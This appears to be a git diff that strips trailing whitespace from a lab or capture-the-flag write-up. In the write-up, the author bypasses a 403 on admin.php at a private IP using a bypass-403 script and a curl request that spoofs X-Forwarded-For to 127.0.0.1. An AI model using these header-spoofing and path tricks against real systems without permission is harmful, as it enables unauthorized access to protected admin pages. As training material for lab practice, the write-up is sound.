@@ -55,22 +55,22 @@ So, we have admin.php. Let's check it out.
 We have a 403 Forbidden page. Let's see if we can bypass that, we will use bypass-403 tool.
 
 ```bash
-kali@kali:./bypass-403.sh http://192.168.5.179/admin.php                                                                         
- ____                                  _  _    ___ _____ 
-| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
-|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
+kali@kali:./bypass-403.sh http://192.168.5.179/admin.php
+ ____                                  _  _    ___ _____
+| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ /
+|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \
 | |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
-|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
-       |___/|_|                                          
+|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/
+       |___/|_|
                                                By Iam_J0ker
 ./bypass-403.sh https://example.com path
- 
+
 200,838  --> http://192.168.5.179/admin.php/
 200,838  --> http://192.168.5.179/admin.php/%2e/
 200,838  --> http://192.168.5.179/admin.php//.
 200,838  --> http://192.168.5.179/admin.php////
 200,838  --> http://192.168.5.179/admin.php/.//./
-200,838  --> http://192.168.5.179/admin.php/ -H X-Original-URL: 
+200,838  --> http://192.168.5.179/admin.php/ -H X-Original-URL:
 200,838  --> http://192.168.5.179/admin.php/ -H X-Custom-IP-Authorization: 127.0.0.1
 200,908  --> http://192.168.5.179/admin.php/ -H X-Forwarded-For: 127.0.0.1
 200,838  --> http://192.168.5.179/admin.php/ -H X-Forwarded-For: http://127.0.0.1
@@ -99,7 +99,7 @@ jq: parse error: Invalid numeric literal at line 1, column 20
 This is quite misleading, as every request return 200. So, we will try some manually.
 
 ```bash
-kali@kali:curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.5.179/admin.php                                                                                      
+kali@kali:curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.5.179/admin.php
 <!DOCTYPE html>
 <html lang="en">
 <head>
